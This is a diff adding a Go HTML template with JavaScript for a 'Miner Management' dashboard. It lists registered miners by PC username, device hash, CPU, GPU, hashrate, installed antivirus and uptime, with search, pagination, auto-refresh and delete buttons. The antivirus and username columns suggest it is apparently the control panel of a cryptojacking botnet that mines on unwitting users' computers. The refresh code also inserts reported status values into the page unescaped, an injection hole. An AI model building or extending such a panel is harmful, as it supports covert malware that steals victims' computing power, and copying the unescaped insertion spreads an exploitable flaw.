@@ -1,0 +1,275 @@
+{{define "content"}}
+<div class="miners-page">
+    <h2>Miner Management</h2>
+    
+    <div class="miners-controls">
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; gap: 20px;">
+            <div>
+                <h3 style="margin: 0;">Registered Miners</h3>
+                <small id="filterInfo" style="color: #666;">Total: <span id="totalCount">0</span> miners | Showing: <span id="filteredCount">0</span></small>
+            </div>
+            <div>
+                <label for="rowsPerPageSelect" style="margin-right: 10px;">Rows per page:</label>
+                <select id="rowsPerPageSelect" style="padding: 5px; border-radius: 4px; border: 1px solid #ccc;">
+                    <option value="10">10</option>
+                    <option value="15">15</option>
+                    <option value="20">20</option>
+                    <option value="30">30</option>
+                    <option value="50">50</option>
+                    <option value="100">100</option>
+                </select>
+            </div>
+        </div>
+        <input type="text" id="minerSearch" class="search-input" placeholder="Search by username, device hash, CPU, GPU...">
+    </div>
+
+    <div class="miners-list">
+        {{if .miners}}
+        <table class="miners-table" style="font-size: 0.9em; line-height: 1.4;">
+            <thead>
+                <tr>
+                    <th style="padding: 5px 3px;">PC Username</th>
+                    <th style="padding: 5px 3px;">Device Hash</th>
+                    <th style="padding: 5px 3px;">CPU</th>
+                    <th style="padding: 5px 3px;">GPU</th>
+                    <th style="padding: 5px 3px;">CPU H/s</th>
+                    <th style="padding: 5px 3px;">GPU H/s</th>
+                    <th style="padding: 5px 3px;">Antivirus</th>
+                    <th style="padding: 5px 3px;">Uptime</th>
+                    <th style="padding: 5px 3px;">Status</th>
+                    <th style="padding: 5px 3px;">Actions</th>
+                </tr>
+            </thead>
+            <tbody id="minersTableBody">
+                {{range .miners}}
+                <tr data-miner-id="{{.ID}}" class="miner-row" data-searchable="{{.PCUsername}} {{.DeviceHash}} {{.CPUName}} {{.GPUName}} {{.Status}}" style="padding: 2px;">
+                    <td style="padding: 3px 2px; max-width: 80px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">{{.PCUsername}}</td>
+                    <td style="padding: 3px 2px; max-width: 120px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;"><code style="font-size: 0.85em;">{{.DeviceHash}}</code></td>
+                    <td style="padding: 3px 2px; max-width: 100px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">{{.CPUName}}</td>
+                    <td style="padding: 3px 2px; max-width: 100px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">{{.GPUName}}</td>
+                    <td style="padding: 3px 2px; text-align: right;"><span class="hashrate" data-value="{{.CPUHashRate}}">{{printf "%.2f" .CPUHashRate}} H/s</span></td>
+                    <td style="padding: 3px 2px; text-align: right;"><span class="hashrate" data-value="{{.GPUHashRate}}">{{printf "%.2f" .GPUHashRate}} H/s</span></td>
+                    <td style="padding: 3px 2px; max-width: 80px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">{{.AntivirusName}}</td>
+                    <td style="padding: 3px 2px; text-align: right;"><span class="uptime" data-minutes="{{.DeviceUptimeMin}}">{{formatUptime .DeviceUptimeMin}}</span></td>
+                    <td style="padding: 3px 2px;"><span class="status {{.Status}}" style="font-size: 0.9em; padding: 2px 4px;">{{.Status}}</span></td>
+                    <td style="padding: 3px 2px;">
+                        <button class="btn btn-danger btn-sm delete-miner" data-id="{{.ID}}" style="font-size: 0.85em; padding: 2px 6px;">Delete</button>
+                    </td>
+                </tr>
+                {{end}}
+            </tbody>
+        </table>
+        
+        <div class="pagination-controls" style="margin-top: 15px;">
+            <button id="prevPage" class="btn btn-secondary">Previous</button>
+            <span id="pageInfo" class="page-info">Page 1 of <span id="totalPages">1</span></span>
+            <button id="nextPage" class="btn btn-secondary">Next</button>
+            <small id="rowCountInfo" style="margin-left: 20px; color: #666;">Displaying <span id="displayCount">0</span> rows on this page</small>
+        </div>
+        {{else}}
+        <p class="empty-message">No miners connected yet.</p>
+        {{end}}
+    </div>
+</div>
+
+<script>
+let ROWS_PER_PAGE = 10;
+let currentPage = 1;
+let allRows = [];
+let filteredRows = [];
+
+// Format hashrate to appropriate unit
+function formatHashrate(value) {
+    if (value === 0 || isNaN(value)) return '0 H/s';
+    if (value >= 1000000) return (value / 1000000).toFixed(2) + ' MH/s';
+    if (value >= 1000) return (value / 1000).toFixed(2) + ' KH/s';
+    return value.toFixed(2) + ' H/s';
+}
+
+// Format uptime in minutes to hours and minutes
+function formatUptime(minutes) {
+    if (minutes === 0 || isNaN(minutes)) return '0m';
+    const hours = Math.floor(minutes / 60);
+    const mins = minutes % 60;
+    if (hours === 0) {
+        return mins + 'm';
+    } else if (mins === 0) {
+        return hours + 'h';
+    } else {
+        return hours + 'h ' + mins + 'm';
+    }
+}
+
+document.addEventListener('DOMContentLoaded', function() {
+    const searchInput = document.getElementById('minerSearch');
+    const prevPageBtn = document.getElementById('prevPage');
+    const nextPageBtn = document.getElementById('nextPage');
+    const rowsPerPageSelect = document.getElementById('rowsPerPageSelect');
+
+    // Format all hashrates
+    document.querySelectorAll('.hashrate[data-value]').forEach(el => {
+        const value = parseFloat(el.dataset.value);
+        el.textContent = formatHashrate(value);
+    });
+
+    // Format all uptimes
+    document.querySelectorAll('.uptime[data-minutes]').forEach(el => {
+        const minutes = parseInt(el.dataset.minutes);
+        el.textContent = formatUptime(minutes);
+    });
+
+    // Auto-refresh miner data every 10 seconds
+    setInterval(refreshMiners, 10000);
+    // Initialize pagination
+    allRows = Array.from(document.querySelectorAll('.miner-row'));
+    filteredRows = allRows;
+    updateCounts();
+    initializePagination();
+
+    searchInput.addEventListener('input', function() {
+        const searchTerm = this.value.toLowerCase();
+        currentPage = 1;
+        
+        if (searchTerm === '') {
+            filteredRows = allRows;
+        } else {
+            filteredRows = allRows.filter(row => {
+                const searchable = row.getAttribute('data-searchable').toLowerCase();
+                return searchable.includes(searchTerm);
+            });
+        }
+        
+        updateCounts();
+        initializePagination();
+        displayPage(currentPage);
+    });
+
+    prevPageBtn.addEventListener('click', function() {
+        if (currentPage > 1) {
+            currentPage--;
+            displayPage(currentPage);
+            window.scrollTo(0, 0);
+        }
+    });
+
+    nextPageBtn.addEventListener('click', function() {
+        const totalPages = Math.ceil(filteredRows.length / ROWS_PER_PAGE);
+        if (currentPage < totalPages) {
+            currentPage++;
+            displayPage(currentPage);
+            window.scrollTo(0, 0);
+        }
+    });
+
+    rowsPerPageSelect.addEventListener('change', function() {
+        ROWS_PER_PAGE = parseInt(this.value);
+        currentPage = 1;
+        initializePagination();
+        displayPage(currentPage);
+    });
+
+    // Attach delete handlers
+    attachDeleteHandlers();
+
+    displayPage(1);
+});
+
+// Refresh miner data from the server
+async function refreshMiners() {
+    try {
+        const response = await fetch('/api/miners');
+        if (!response.ok) return;
+        
+        const miners = await response.json();
+        if (!miners) return;
+
+        // Update existing rows with new data
+        miners.forEach(miner => {
+            const row = document.querySelector(`tr[data-miner-id="${miner.id}"]`);
+            if (row) {
+                // Update hashrate cells
+                const cells = row.querySelectorAll('td');
+                if (cells.length >= 6) {
+                    // CPU Hashrate (index 4)
+                    cells[4].textContent = formatHashrate(miner.cpu_hashrate);
+                    // GPU Hashrate (index 5)
+                    cells[5].textContent = formatHashrate(miner.gpu_hashrate);
+                }
+                // Update uptime (index 7)
+                if (cells.length >= 8) {
+                    cells[7].textContent = formatUptime(miner.device_uptime_min);
+                }
+                // Update status (index 8)
+                if (cells.length >= 9) {
+                    cells[8].innerHTML = '<span class="status ' + miner.status + '" style="font-size: 0.9em; padding: 2px 4px;">' + miner.status + '</span>';
+                }
+            }
+        });
+    } catch (error) {
+        console.error('Error refreshing miners:', error);
+    }
+}
+
+function attachDeleteHandlers() {
+    document.querySelectorAll('.delete-miner').forEach(btn => {
+        btn.addEventListener('click', async function(e) {
+            e.preventDefault();
+            if (confirm('Are you sure you want to delete this miner?')) {
+                const minerId = this.getAttribute('data-id');
+                try {
+                    const response = await fetch('/api/miners/delete', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded'
+                        },
+                        body: 'id=' + minerId
+                    });
+                    
+                    if (response.ok) {
+                        alert('Miner deleted successfully!');
+                        location.reload();
+                    } else {
+                        alert('Error deleting miner');
+                    }
+                } catch (error) {
+                    alert('Error: ' + error.message);
+                }
+            }
+        });
+    });
+}
+
+function initializePagination() {
+    const totalPages = Math.ceil(filteredRows.length / ROWS_PER_PAGE);
+    document.getElementById('totalPages').textContent = totalPages || 1;
+    
+    const prevBtn = document.getElementById('prevPage');
+    const nextBtn = document.getElementById('nextPage');
+    
+    prevBtn.disabled = currentPage === 1;
+    nextBtn.disabled = currentPage >= totalPages;
+}
+
+function updateCounts() {
+    document.getElementById('totalCount').textContent = allRows.length;
+    document.getElementById('filteredCount').textContent = filteredRows.length;
+}
+
+function displayPage(page) {
+    const startIdx = (page - 1) * ROWS_PER_PAGE;
+    const endIdx = startIdx + ROWS_PER_PAGE;
+    
+    allRows.forEach(row => row.style.display = 'none');
+    
+    const rowsToShow = filteredRows.slice(startIdx, endIdx);
+    rowsToShow.forEach(row => row.style.display = '');
+    
+    document.getElementById('pageInfo').innerHTML = 
+        'Page ' + page + ' of <span id="totalPages">' + Math.ceil(filteredRows.length / ROWS_PER_PAGE || 1) + '</span>';
+    document.getElementById('displayCount').textContent = rowsToShow.length;
+    
+    initializePagination();
+    attachDeleteHandlers();
+}
+</script>
+{{end}}
